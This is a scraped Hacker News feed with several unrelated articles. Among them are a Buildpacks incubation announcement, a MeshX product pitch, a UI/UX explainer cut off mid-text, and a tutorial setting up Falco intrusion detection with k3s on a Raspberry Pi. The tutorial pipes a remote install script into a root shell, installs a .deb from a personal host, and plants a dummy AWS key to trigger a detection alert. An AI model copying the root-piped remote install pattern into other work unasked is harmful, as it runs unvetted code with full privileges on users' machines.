			<p><img width="640" height="480" src="https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-1440x1080.jpg" alt="WhiteHat Jr" srcset="https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-1440x1080.jpg 1440w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-1024x768.jpg 1024w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-400x300.jpg 400w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-768x576.jpg 768w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-1536x1152.jpg 1536w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-2048x1536.jpg 2048w, https://mk0themorningcocbq4h.kinstacdn.com/wp-content/uploads/2020/11/pexels-shamia-casiano-944743-600x450.jpg 600w" sizes="(max-width: 640px) 100vw, 640px">			</p><!-- .post-thumbnail -->

							<!-- <div class="blog-feaured-img" style="background-image: url('');"></div> -->
		
		<div>
								<div>
						
<p>Shaarif Ansari got the call on 11 November at around 9 in the morning. On the phone was a police officer from Powai police station, in the suburbs of Mumbai. “Ansari please come to the police station,” said the officer. “We have received a complaint from your employer WhiteHat Jr. The company officials are here at the station already. We are waiting for you.”&nbsp;</p>


<p>Ansari was taken aback. It is not everyday that you have a police officer call you. Almost immediately he clarified that he did not work at WhiteHat Jr anymore. That he was fired by the company in the first week of September and had had no contact with them since, so what was all this about? The person was in no mood to explain or chat. He cut Ansari off, and asked him to turn up at the station immediately. Caught completely by surprise and with no idea about what was in store for him, Ansari said he was on his way.</p>

						<div>
							<div>
								<p>
									You can read this story by signing up for a <span><a href="https://themorningcontext.com/indias-whitehatjr-is-startup-hell/">free account</a></span>.  or <a href="https://themorningcontext.com/indias-whitehatjr-is-startup-hell/">log in</a> if you are already a member.
								</p>
							</div>
						</div>
					</div>
				
		
					</div><!-- .entry-content -->

					
				
				<div>
				<p><img src="https://mk0themorningcocbq4h.kinstacdn.com/wp-content/themes/tmc/images/auth-abt-close.svg" alt=""></p><div>
				<p>
				<h3>sign up to read the whole article</h3>
				<h5>PLUS OTHER FREE STORIES ON THE MORNING CONTEXT</h5>
		<!-- / 		<div class="tmc-form-container">
		// 			<img src="https://mk0themorningcocbq4h.kinstacdn.com/images/auth-abt-close.svg" alt="" class="close-sign-up">
		// 			<div class="width-setter">
		// 				<div class="left-side-content">
		// 					<h3 class="form-title main-title"></h3>
		// 					<h5 class="form-subtitle"></h3>
		// 					
		// 							// 				</div>
		// 				<div class="right-side-img">
		// 					<img src="https://mk0themorningcocbq4h.kinstacdn.com/images/half-ellipse.svg" alt="">
		// 				</div>
		// 			</div>
		// 		</div>
	-->
	</p></div></div></article><!-- #post-83914 -->

		</main><!-- #main -->
	</div><!-- #primary -->


	</div></div>]]>
            </description>
            <link>https://themorningcontext.com/indias-whitehatjr-is-startup-hell/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25141240</guid>
            <pubDate>Wed, 18 Nov 2020 19:28:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cloud Native Buildpacks Enter Incubation in CNCF]]>
            </title>
            <description>
<![CDATA[
Score 11 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25141102">thread link</a>) | @sclevine
<br/>
November 18, 2020 | https://www.cncf.io/blog/2020/11/18/toc-approves-cloud-native-buildpacks-from-sandbox-to-incubation/ | <a href="https://web.archive.org/web/*/https://www.cncf.io/blog/2020/11/18/toc-approves-cloud-native-buildpacks-from-sandbox-to-incubation/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			
<p>Today, the CNCF Technical Oversight Committee (TOC) voted to promote <a href="https://buildpacks.io/">Cloud Native Buildpacks</a> to incubation from the CNCF sandbox. Since joining CNCF in 2018, the Cloud Native Buildpacks project has added more than 15 new <a href="https://github.com/buildpacks/community/blob/master/ADOPTERS.md">production users</a>, new committers from more organizations, and defined an <a href="https://github.com/buildpacks/community/blob/main/GOVERNANCE.md">open governance process</a> and a clear <a href="https://github.com/buildpacks/community/blob/main/ROADMAP.md">project roadmap</a>.</p>



<p>The goal of the Cloud Native Buildpacks (CNB) project is to translate source code into container images with a focus on developer productivity, container security, and operations involving containerized applications at scale. The project also aims to unify the buildpack ecosystems of the past with a well-defined contract ideal for modern cloud native platforms.</p>



<p>“Cloud Native Buildpacks enable developers to work at whichever layer of abstraction is most productive for them while solving big problems like vulnerable dependencies and slow builds,” said Emily Casey, Buildpacks maintainer and staff engineer at VMware. “The project’s robust specification and tools have helped facilitate an ecosystem of composable buildpacks that interoperate with diverse platforms. We are excited to continue to grow the community as Buildpacks moves to incubation.”&nbsp;</p>



<p>“Heroku (Salesforce) open sourced the original Buildpacks project in 2012 with the hope that they would spread beyond the Heroku platform,” said Terence Lee, Buildpacks co-creator and principal engineer at Salesforce. “In 2018, Heroku and Pivotal (VMware) came together to start Cloud Native Buildpacks as a CNCF Sandbox project. With the move from the CNCF Sandbox to Incubation, Buildpacks are now fulfilling that vision while using OCI Image standards, increasing transparency, and building our community. We look forward to working with the community on new features and even more adoption.”&nbsp;</p>



<p>Cloud Native Buildpacks were accepted into the CNCF Sandbox in October 2018. Buildpacks are used in production by end user organizations, including Greenhouse, Salesforce, and VMware; in cloud native open source software <a href="https://github.com/cloudfoundry/cf-for-k8s/blob/master/README.md#purpose">Cloud Foundry on K8s</a>, <a href="https://github.com/GoogleContainerTools/skaffold/tree/master/examples/buildpacks">Google Skaffold</a>, <a href="https://www.hashicorp.com/blog/announcing-waypoint">Hashicorp Waypoint</a>, and <a href="https://github.com/pivotal/kpack">kpack</a>; and in commercial offerings including <a href="https://www.digitalocean.com/docs/app-platform/concepts/buildpack/">DigitalOcean App Platform,</a> <a href="https://cloud.google.com/blog/products/containers-kubernetes/google-cloud-now-supports-buildpacks">Google Cloud</a>, <a href="https://developer.salesforce.com/blogs/2019/11/introducing-salesforce-evergreen.html">Salesforce Evergreen</a>, and <a href="https://tanzu.vmware.com/build-service">VMware Tanzu Build Service</a>.</p>



<p>“HashiCorp Waypoint was built from day one with buildpacks in mind. We wanted a way for developers to go from code to deploy as quickly and easily as possible and Cloud Native Buildpacks provided the standard, technology, and community to achieve that goal,” says Mitchell Hashimoto, founder of HashiCorp “We look forward to continue investing in and improving our buildpack usage.”</p>



<p>“Developers shouldn’t have to think about how to package their applications for deployment, so I’m excited to see Cloud Native Buildpacks promoted to a CNCF incubation project,” said James Ward, developer advocate, Google Cloud. “At Google Cloud, we’ve open sourced our Buildpacks and added support for them into numerous products, including Cloud Build, Cloud Run, App Engine, Cloud Functions, Cloud Code, Cloud Shell, and Skaffold. Now going from source to running on the cloud is even easier.”&nbsp;</p>



<p><strong>Main Buildpacks Features:</strong></p>



<ul><li><strong>Specification</strong> – a formal-language <a href="https://github.com/buildpacks/spec">specification</a> that describes the platform-to-buildpack contract.</li><li><strong>Implementation</strong> –&nbsp; robust lifecycle tooling necessary for platforms to add support for building images using buildpacks.</li><li><strong>Platform</strong> – components that provide a developer experience directly to end users, including integrations with popular build tools and cloud platforms.&nbsp;</li></ul>



<p><strong>Notable Milestones:</strong></p>



<ul><li>6 maintainers from Salesforce and VMware</li><li>20 committers&nbsp;</li><li>More than 2k contributions</li><li>Almost&nbsp; 5k commits</li><li>Over 1,200k GitHub Stars</li><li>15 contributors</li></ul>



<p>The Cloud Native Buildpacks project is complementary to other CNCF projects, including Helm, Harbor, and Kubernetes. Cloud Native Buildpacks produce Open Container Initiative (OCI) images managed by Helm, stored in Harbor, and deployed to Kubernetes. The project’s overarching goal is to provide a reliable, safe, modular, and fast way to build OCI images from source or input artifacts.&nbsp;</p>



<p>“Cloud Native Buildpacks provide a reliable and seamless way to turn code into containers,” said Chris Aniszczyk, CTO of Cloud Native Computing Foundation and executive director of OCI. “This lowers the barrier for developers to take advantage of cloud native technology and improves the developer experience for a segment of developers and cloud native platforms.”</p>



<p>“Users need a simple way to package, provision, and manage cloud native applications. Buildpacks – originally used by Heroku or Cloud Foundry – have now gone fully cloud-native, embracing key patterns popularized by Kubernetes.” said Alexis Richardson, CEO Weaveworks and former CNCF TOC member, “Those are the same key patterns that are at the core of GitOps, and used in combination they provide Weaveworks customers the ability to upgrade and patch their application deployments.”</p>



<p>As a CNCF-hosted project, joining incubating technologies Argo, CloudEvents, CNI, Contour, Cortex, CRI-O, Dragonfly, etcd, Falco, gRPC, Linkerd, NATS, Notary, OPA, OpenTracing, Operator Framework, Rook, SPIFFE, SPIRE, Thanos, and KubeEdge, Cloud Native Buildpacks is part of a neutral foundation aligned with its technical interests, as well as the larger Linux Foundation, which provides governance, marketing support, and community outreach. For more information on maturity requirements for each level, please visit the <a href="https://github.com/cncf/toc/blob/master/process/graduation_criteria.adoc">CNCF Graduation Criteria</a>.</p>



<p>To learn more about Cloud Native Buildpacks, visit <a href="https://buildpacks.io/">buildpacks.io</a>. The maintainers will be hosting <a href="https://kccncna20.sched.com/event/focW?iframe=no">office hours</a> during <a href="https://events.linuxfoundation.org/kubecon-cloudnativecon-north-america/">KubeCon + CloudNativeCon North America Virtual 2020</a> to answer any questions about the project. Be sure to <a href="https://zoom.us/webinar/register/WN_4PhgzL2SRtaMacu6ZYdSYg">register and join</a> on Friday, November 20 at 4:00 pm EST.</p>


			<hr>
			
		</div></div>]]>
            </description>
            <link>https://www.cncf.io/blog/2020/11/18/toc-approves-cloud-native-buildpacks-from-sandbox-to-incubation/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25141102</guid>
            <pubDate>Wed, 18 Nov 2020 19:17:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Running Falco and k3s at the edge with 64-bit ARM]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25141061">thread link</a>) | @alexellisuk
<br/>
November 18, 2020 | https://blog.alexellis.io/falco-at-the-edge-arm64/ | <a href="https://web.archive.org/web/*/https://blog.alexellis.io/falco-at-the-edge-arm64/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
    <article>

        

        <section>
            <div><p>Falco is an open source tool that peeks into the internals of your system to detect and report on syscall and network activity. It was originally built at <a href="https://sysdig.com/">Sysdig</a> and later donated to the <a href="https://www.cncf.io/">CNCF</a> where it's doing well as an Incubator project with an active community.</p>
<p>My understanding of Falco from <a href="https://twitter.com/lorisdegio">Sysdig's CTO</a> is that it's designed to be the last-line of defence in systems where the focus is usually put on preventative measures. Falco stands in to report on anomalies and unexpected behaviour.</p>
<p>When running <a href="https://k3s.io/">k3s</a> at an edge location, it may be difficult to gain physical access to servers, and there may be partial connectivity available.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/10/cluster-board.jpg" alt="cluster-board"></p>
<blockquote>
<p>Pictured above: a net-booted Raspberry Pi cluster running on a purpose-designed industrial unit "BitScope Cluster Blade" by <a href="https://bitscope.com/blog/JK/?p=JK38B">BitScope Designs</a></p>
</blockquote>
<p>By default there are three possible event sources for Falco:</p>
<ul>
<li>The kernel and a number of syscalls</li>
<li><a href="https://ebpf.io/">eBPF</a> - faster than kernel access, but not available everywhere</li>
<li>Userland using <a href="https://man7.org/linux/man-pages/man2/ptrace.2.html">PTRACE(2)</a> - for potential use with SaaS products like AWS Lambda</li>
</ul>
<p>These events can be sent to a webhook such as an <a href="https://www.openfaas.com/">OpenFaaS function</a> for remediation at the edge, or alerting and decision-making in a centralised action-centre in the cloud. As a generic event-sink, data can be ingested directly from the Kubernetes API, but a smart device such as a door-lock could also send data such as the current temperature, or unexpected motion picked up from an accelerometer.</p>
<p><img src="https://blog.alexellis.io/content/images/2020/10/Event-detection--and-remediation-with-OpenFaaS.png" alt="Event-detection--and-remediation-with-OpenFaaS"></p>
<blockquote>
<p>Conceptual architecture: event detection from the Kernel, eBPF, the k3s API with alerting and remediation via <a href="https://www.openfaas.com/">OpenFaaS</a>.</p>
</blockquote>
<p>In this guide I'll show you how to configure Falco to run at the edge with k3s on an ARM64 host such as the <a href="https://amperecomputing.com/emag/">Ampere eMAG®</a> provided by <a href="https://blog.equinix.com/blog/2020/10/06/equinix-metal-metal-and-more/">Equinix Metal</a> (Equinix provide credits for open source projects hosted by the CNCF), an AWS Graviton instance, or a <a href="https://www.raspberrypi.org/products/raspberry-pi-4-model-b/">Raspberry Pi 4</a>.</p>
<h2 id="tutorial">Tutorial</h2>
<p>We'll start off by flashing Ubuntu Linux to the SD card, then adding k3s, finally we'll install Falco and configure k3s to send it events.</p>
<h3 id="downloadtheoperatingsystem">Download the Operating System</h3>
<p>You will need a Raspbery Pi 4. I am using a device with 4GB of RAM, but 2GB will also work.</p>
<p>Download the Ubuntu 20.04.01 image using the link for the Raspberry Pi 4.</p>
<p>You can get the image here: <a href="https://ubuntu.com/download/raspberry-pi">https://ubuntu.com/download/raspberry-pi</a></p>
<p>Now use <a href="https://etcher.io/">Etcher.io</a> or <code>dd</code> to write the server OS image to your Raspberry Pi's SD card.</p>
<h3 id="firstboot">First boot</h3>
<blockquote>
<p>Note: Unlike with RaspiOS, SSH is enabled by default.</p>
</blockquote>
<p>Boot up the machine and find it on your network using <code>nmap</code>:</p>
<pre><code>nmap -sP 192.168.0.0/24
</code></pre>
<p>Log in and change the password from <code>ubuntu</code> to whatever you like:</p>
<pre><code>ssh ubuntu@192.168.0.101
</code></pre>
<p>Next, copy over your SSH key:</p>
<pre><code>ssh-copy-id ubuntu@192.168.0.101
</code></pre>
<h3 id="preparefork3s">Prepare for k3s</h3>
<p>Edit <code>/firmware/boot/cmdline.txt</code> and add to the first line, don't add any line-breaks:</p>
<pre><code>cgroup_enable=cpuset cgroup_memory=1 cgroup_enable=memory
</code></pre>
<p>This enables cgroups which are required to set limits for containers. The step is taken from my tutorial for Raspbian: <a href="https://blog.alexellis.io/test-drive-k3s-on-raspberry-pi/">Will it cluster? k3s on your Raspberry Pi</a></p>
<p>Reboot your RPi:</p>
<pre><code>sudo reboot
</code></pre>
<h3 id="installk3swithk3sup">Install k3s with k3sup</h3>
<p>Use my k3sup tool to your workstation to install k3s over SSH. Do not run this on the RPi itself.</p>
<pre><code>curl -sLS https://get.k3sup.dev | sudo sh
</code></pre>
<p>Now install via <code>k3sup install</code>:</p>
<pre><code>k3sup install --ip 192.168.0.101 --user ubuntu \
  --channel latest
</code></pre>
<p>The <code>--channel</code> command installs Kubernetes 1.19.</p>
<h3 id="installfalcoanditsdependencies">Install Falco and its dependencies</h3>
<p>Log back into the RPi via SSH.</p>
<p>A fork of the upstream project is required to run on 64-bit ARM at present, but I expect these changes to be merged back in soon. A maintainer has provided a .deb file:</p>
<pre><code>sudo apt-get -y install linux-headers-$(uname -r) dkms
</code></pre>
<p>DKMS is required to build a Kernel module. This is one of the ways that Falco can instrument your system.</p>
<blockquote>
<p>You can also build from source using the <code>build/aarch64</code> branch.</p>
</blockquote>
<p>Install Falco's binary and let it build its kernel module:</p>
<pre><code>wget https://fs.fntlnz.wtf/falco/aarch64-builds/falco-0.26.1-48%2Bf82d905-aarch64.deb

sudo dpkg -i ./falco-0.26.1-48+f82d905-aarch64.deb
</code></pre>
<p>Silence some errors in the falco config file.</p>
<p>Edit <code>/etc/falco/falco.yaml</code> and replace the following:</p>
<pre><code>syscall_event_drops:
  actions:
    - log
    - alert
  rate: .03333
  max_burst: 10
</code></pre>
<p>With:</p>
<pre><code>syscall_event_drops:
  actions:
    - ignore
  rate: .03333
  max_burst: 10
</code></pre>
<p>This turns off some noise that I was seeing from the ARM-64 version.</p>
<p>Enable it upon boot-up:</p>
<pre><code>sudo systemctl enable falco \
  &amp;&amp; sudo systemctl start falco
</code></pre>
<p>You can find the various pre-loaded rules for falco at <code>/etc/falco/rules/</code></p>
<pre><code>ls /etc/falco/rules/

falco.yaml
falco_rules.local.yaml
falco_rules.yaml
k8s_audit_rules.yaml
</code></pre>
<h3 id="simulateafalcoevent">Simulate a Falco event</h3>
<p>Before configuring Kubernetes to send events to Falco, we can send a sample event that will trigger one of the built-in alerts.</p>
<pre><code>cat &gt;&gt; sample-event.json &lt;&lt;EOF
{"kind":"Event","apiVersion":"audit.k8s.io/v1beta1","metadata":{"creationTimestamp":"2018-10-25T13:58:49Z"},"level":"Request","timestamp":"2018-10-25T13:58:49Z","auditID":"841d3e6d-90d2-43df-8da4-684738bee3d5","stage":"ResponseComplete","requestURI":"/api/v1/namespaces","verb":"create","user":{"username":"system:anonymous","groups":["system:masters","system:authenticated"]},"sourceIPs":["192.168.99.1"],"objectRef":{"resource":"namespaces","name":"foo","apiVersion":"v1"},"responseStatus":{"metadata":{},"code":201},"requestObject":{"kind":"Namespace","apiVersion":"v1","metadata":{"name":"foo","creationTimestamp":null},"spec":{},"status":{"phase":"Active"}},"requestReceivedTimestamp":"2018-10-25T13:58:49.730588Z","stageTimestamp":"2018-10-25T13:58:49.736141Z","annotations":{"authorization.k8s.io/decision":"allow","authorization.k8s.io/reason":""}}
EOF
</code></pre>
<p>Invoke the event via Falco's REST API:</p>
<pre><code>curl http://127.0.0.1:8765/k8s-audit --data-binary @sample-event.json -H "Content-Type: application/json"
</code></pre>
<h3 id="triggeraneventfromk3s">Trigger an event from k3s</h3>
<p>An additional source we can add is the events from the Kubernetes audit log. This feature has to be turned on via the k3s systemd definition.</p>
<p>Create a folder for audit events:</p>
<pre><code>sudo mkdir -p /var/lib/rancher/audit
</code></pre>
<p>Download <code>audit-policy.yaml</code> to <code>/var/lib/rancher/audit</code></p>
<pre><code>wget https://raw.githubusercontent.com/falcosecurity/evolution/master/examples/k8s_audit_config/audit-policy.yaml
sudo cp audit-policy.yaml /var/lib/rancher/audit/
</code></pre>
<p>Create a webhook config file:</p>
<pre><code>export IP=192.168.0.23

cat &lt;&lt; EOF | sudo tee /var/lib/rancher/audit/webhook-config.yaml
apiVersion: v1
kind: Config
clusters:
- name: falco
  cluster:
    server: http://$IP:8765/k8s-audit
contexts:
- context:
    cluster: falco
    user: ""
  name: default-context
current-context: default-context
preferences: {}
users: []
EOF
</code></pre>
<p>Edit <code>/etc/systemd/system/k3s.service</code> and add these lines to the end:</p>
<pre><code>        '--kube-apiserver-arg=audit-log-path=/var/lib/rancher/audit/audit.log' \
        '--kube-apiserver-arg=audit-policy-file=/var/lib/rancher/audit/audit-policy.yaml' \
        '--kube-apiserver-arg=audit-webhook-config-file=/var/lib/rancher/audit/webhook-config.yaml' \
</code></pre>
<p>Now reload:</p>
<pre><code>sudo systemctl daemon-reload &amp;&amp; \
 sudo systemctl restart k3s
</code></pre>
<p>My favourite use-case from the docs was detecting AWS secret keys stored in ConfigMaps. Of course, we all know confidential data belongs inside Vault or Kubernetes Secrets which can be encrypted at rest.</p>
<p>Let's try it out?</p>
<p>Run this from your laptop:</p>
<pre><code>kubectl create configmap aws-creds \
  --from-literal aws_access_key_id=AKES20LNOA
</code></pre>
<p>Now check the logs from Falco:</p>
<pre><code>sudo journalctl -u falco --lines 100

Oct 13 16:55:42 ubuntu falco[89818]: 16:55:24.207932928: Warning K8s configmap with private credential (user=system:admin verb=create configmap=aws-creds-1 config={"aws_access_key_id":"AKES20LNOA"})
</code></pre>
<p>You can find this example under <a href="https://falco.org/docs/event-sources/kubernetes-audit/">"Kubernetes Audit Rules" in the Falco docs</a>.</p>
<h3 id="expandthek3scluster">Expand the k3s cluster</h3>
<p>You can add additional nodes into the k3s cluster by installing Ubuntu as we did for the first node, then running the <code>k3sup join</code> command.</p>
<pre><code>k3sup join --ip $IP -user ubuntu \
  --server-ip 192.168.0.101
</code></pre>
<p>k3s also supports High-Availability and fail-over of the master nodes using a SQL backend or an embedded version of etcd.</p>
<h2 id="wrappingup">Wrapping-up</h2>
<blockquote>
<p>Full disclosure: Sysdig is a client of <a href="https://www.openfaas.com/consulting/">OpenFaaS Ltd</a></p>
</blockquote>
<p>We now have Ubuntu 20.04.01, Kubernetes with k3s and Falco all built for 64-bit ARM running on our Raspberry Pi.</p>
<p>It's now over to you to <a href="https://falco.org/">explore Falco more</a>, and to fine-tune your Kubernetes rules.</p>
<p>I also want to give a shout out to my friend <a href="https://twitter.com/fntlnz">fntlnz</a> who is the Falco maintainer that helped me get a working build of Falco on 64-bit ARM. It took us several days to get here.</p>
<h3 id="recommendations">Recommendations</h3>
<p>It took me quite a while to figure out how to get this to work, but it was nice when everything clicked into place. So be warned, the Falco documentation still refers to "Dynamic Auditing" which was removed and deprecated in Kubernetes and the upstream instructions don't cover k3s yet, or any release newer than 1.13.</p>
<p>I hope to see the team at Sysdig spend some time updating the documentation and examples for newer Kubernetes releases and for an official 64-bit ARM binary to be made available soon.</p>
<h3 id="takingitfurther">Taking it further</h3>
<p>The easier way to get security and other insights, just like the open source Falco project is to use Sysdig's paid product. You can find a step-by-step tutorial by Dan here: <a href="https://sysdig.com/blog/k3s-sysdig-falco/">K3s + Sysdig: Deploying and securing your cluster… in less than 8 minutes!</a></p>
<p>You may also like my walk-through video: <a href="https://www.youtube.com/watch?v=vzZa-8oXF88&amp;feature=youtu.be">Installing Ubuntu and k3s to my Raspberry Pi 4</a></p>
<iframe width="560" height="315" src="https://www.youtube.com/embed/vzZa-8oXF88" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe>
<p>Find out more about the tools:</p>
<ul>
<li><a href="https://k3sup.dev/">k3sup</a></li>
<li><a href="https://www.openfaas.com/">OpenFaaS</a></li>
<li><a href="https://github.com/falcosecurity/falco">Falco</a></li>
</ul>
</div>
        </section>

        

    </article>
</div></div>]]>
            </description>
            <link>https://blog.alexellis.io/falco-at-the-edge-arm64/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25141061</guid>
            <pubDate>Wed, 18 Nov 2020 19:13:53 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[MeshX: Foundation for Your Business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25140986">thread link</a>) | @szkovacs_roland
<br/>
November 18, 2020 | https://mesh-x.com/posts/announcing-meshx | <a href="https://web.archive.org/web/*/https://mesh-x.com/posts/announcing-meshx">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="__next"><div><article><div><div><p>Have you ever find yourself replacing a tool in your stack because it can't grow with your needs?
Not every app designed to scale well. Sometimes you ran into issues what one app can't solve. So you add another tool to the stack. But now your data in two different places and you have to learn a new app with a new UI. This is time-consuming and your data is scattered across apps.</p>
<h2>Introducing MeshX</h2>
<p>MeshX is a platform to build scalable tools and processes for your team. The purpose is to provide you with the building blocks and grant you full control. We think that one tool can replace the many others. How we achieve this? Let me explain.</p>
<h2>Building Blocks</h2>
<p>All of your apps that you use probably has 3 components:</p>
<ol>
<li>It needs to store your data structured somewhere.</li>
<li>A way to view and interact with the data.</li>
<li>And it has some magic ✨ rules that make it work.</li>
</ol>
<h3>1. Custom domain</h3>
<p>So you first need data. This data usually has some schema to it probably one of the following:</p>
<ol>
<li><strong>Hardcoded domain</strong>: The most common way to handle the problem. E.g. in JIRA you have your issues, bugs, backlog, ideas, releases. This design by its nature is not extendable. The developers of the app needs to support the features you need. There is no way to define domains on your own.</li>
<li><strong>Generic domain</strong>: Okay, so let's abstract away the schema into generic domains. E.g. in Wrike you have tasks, projects, folders. You can model many things this way, it's extensible. But the solution is not native. At larger scale it easily becomes out of control. This schema has hierarchical relations, which is not intuitive for some use cases.</li>
<li><strong>Domain-less</strong>: No relation, no schema for your data. Trello works this way. You have boards, lists and cards, then you can decide what you want to store. It's flexible, but don't scale well. A lot of company using Trello in early stages but later they need to swap because this type not work well with growing needs.</li>
<li><strong>Custom domain</strong>: Custom domain combine the advantages of the above solutions. It let you define your custom <strong>types</strong> and relation between them. Of course this comes with complexity. But for that you get endless scalability and extensibility.</li>
</ol>
<p>I believe that custom domain is the future. It has a lot of potential and match really well with agile companies.</p>
<p><img src="https://mesh-x.com/images/type.jpg" alt="Custom schema" title="Custom Schema"></p>
<h3>2. Unified UI</h3>
<p>Secondary you need a way to <strong>view</strong> and interact with your data. Many apps using UI components like: <em>Tables</em>, <em>Boards</em>, <em>Calendars</em>, <em>Documents</em>, <em>Graphs</em>. Similar UI patterns but differ in the use and feel. Basically need to learn the same thing again and again. Unifying these components is speed up the learning curve of new tools and save you and your team time. Imagine you can use your bug tracker using the same UI as your CRM.</p>
<p><img src="https://mesh-x.com/images/table.jpg" alt="Table View" title="Table View">
<img src="https://mesh-x.com/images/board.jpg" alt="Board View" title="Board View"></p>
<h3>3. Custom Workflows</h3>
<p>And finally the apps has some logic. The software code that make it work behind the scenes. In the past you have two choices:</p>
<ul>
<li><em>Use a prebuild tool with fixed functionality (hard to extend and it's not customized)</em></li>
<li><em>Use a custom software built for your needs (its cost a lot of money and time)</em></li>
</ul>
<p>But today there are other options, that gained more popularity in the last years. Low-code and no-code solutions.
In MeshX the rules in your apps can be defined using a low-code/no-code editor. The idea for this actually came from the game industry where visual programming tools are used for a long time. It enabled non-technical users like 3D artists and designers to create custom logic in games. That gave me the idea that it would be a great fit for agile businesses. These <strong>flows</strong> enable you to build tools that replace manual processes and automatize most of your work without need to write a single line of code.</p>
<p><img src="https://mesh-x.com/images/flow.jpg" alt="Flow Editor" title="Flow Editor"></p>
<h2>Summary</h2>
<p>So to wrap this up we have a custom domain for flexibility, unified UI for easy use and custom workflows for custom business needs. Together these blocks are the foundation for all the tools that you can use to run your business. This is the grand vision of MeshX. One tool to rule them all.</p>
<p>If you like the idea to have all of your tools and data organized and automatized, you can sign up for a beta access.
I am also happy to answer your questions in <a href="mailto://roland@mesh-x.com">email</a>.</p>
<p><em>In the next post I'm going to show you an example how to use MeshX to build a simple social media automation tool.</em></p>
</div></div></article></div></div></div>]]>
            </description>
            <link>https://mesh-x.com/posts/announcing-meshx</link>
            <guid isPermaLink="false">hacker-news-small-sites-25140986</guid>
            <pubDate>Wed, 18 Nov 2020 19:09:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UI&UX Schemes]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25140846">thread link</a>) | @_Tata_
<br/>
November 18, 2020 | https://www.ego-cms.com/post/ui-ux-what-is | <a href="https://web.archive.org/web/*/https://www.ego-cms.com/post/ui-ux-what-is">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><a href="https://www.ego-cms.com/tags/services"><p>Services</p></a><h2>UI &amp; UX. Confused?</h2><p>This is just a simple post explaining important differences between the terms User interface and User Experience that will help you better
understand your product and your team.</p></div></div><article><div target="_blank"><p>The terms UI and UX are popular in creative environments. They’ve overwhelmed the internet. Engineers and designers use them in their daily work. Here’s a simple guide to these terms to clarify what they really mean.</p><h2>UI &amp; UX in simple words</h2><p>Imagine that your digital product — a website or an app — is a house. The code is the foundation and frame that shape it.</p><p>In a house, the walls, rooms, doors, and windows define the User Experience (UX). Once upon a time, someone left an opening in a wall so it would be brighter in the house and so they could see anyone approaching and enter the house. Later, someone decided it was better to walk through a door, and thus the door was designed.</p><p>Then someone’s wife decided to make the house more cozy and arranged its furnishings — the User Interface (UI). The UI determines the house’s appearance and convenience for its residents.</p><figure><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5f6ccb886b98300f8672abfa_5cf66e2c714334807254a77f_ux.png" loading="lazy" alt=""></p><figcaption>Photo credit: Charles Deluvio</figcaption></figure><h2>UX makes the interface user-friendly</h2><p>UX design is the process of identifying and solving problems to make an interface user-friendly. You don’t notice the results of a UX designer’s work as long as everything works well. But if you think, <em>What should I click next?</em> then you’re facing an ill-conceived UX.</p><p>How can you create a really good UX? Just make all the interface elements as simple and easy to use as possible!</p><figure id="w-node-ef8575547b1f-7a0a8b78"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5cf66e783f6870c4d093743d_user-flow.png" alt=""></p></figure><h4>What does the UX consist of?</h4><ul role="list"><li><strong>Studying user groups. </strong>This is the biggest stage, during which the designer acquires and analyzes data on competitors and users’ needs.</li><li><strong>Developing structure and strategy.</strong> Based on the results of this analysis, the designer offers a comfortable and flexible solution for an application or website.</li></ul><p>‍<strong>‍</strong></p><figure id="w-node-a2cd1b27daa7-7a0a8b78"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5f6ccbdbb461ee653dce0c50_5d442a5f0a9ce324c7f169df_flow-chart.png" loading="lazy" alt=""></p></figure><p>‍<strong>What does the UX designer do? <br>‍</strong>A UX designer reviews user groups, builds the app structure, and defines user scenarios. They ensure that the mobile application meets users’ needs.<br>‍<br>‍<strong>Should we trust UX? <br>‍</strong>Good UX doesn’t guarantee a product’s commercial success. After all, a user’s experience is subjective. It’s also crucial to take into account the UX offered by rivals!</p><p>‍</p><h2>UI makes interfaces cute</h2><p>UI design is the process of transitioning a product from studies and mockups to a beautiful application or website. First impressions count, so your app should be gorgeous!</p><figure id="w-node-b244a4dc8e0a-7a0a8b78"><p><img src="https://uploads-ssl.webflow.com/5c755d7d6fa90e6b6027e74c/5f6ccbf085b4c2d20e588972_5d4ac8a9d858a33288354f24_5.png" loading="lazy" alt=""></p></figure><h4>What does the UI consist of?</h4><ul role="list"><li>Buttons</li><li>Icons</li><li>Fonts and colors</li><li>Animations</li><li>Infographics</li><li>Widgets</li></ul><p>‍</p><p>How can you create a really good UI? Generally, the designer 